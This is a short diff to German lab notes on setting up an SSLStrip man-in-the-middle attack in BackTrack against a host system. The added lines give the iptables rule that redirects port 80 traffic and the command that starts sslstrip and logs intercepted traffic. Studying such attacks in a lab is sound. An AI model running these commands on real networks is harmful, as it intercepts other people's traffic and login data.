@@ -3,8 +3,9 @@ In Backtrack:
 - SSL-Strip herunterladen und entpacken
 - IP-Forwarding an
 - IP-Tables-Prerouting-Eintrag gemäß README
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 
 - sslstrip starten, Protokoll in Logdatei schreiben
-
+  python sslstrip.py -l 10000 -w log.txt
 In Hostsystem:
 - Defaultroute löschen
 - Defaultroute auf Host-Only-Interface setzen
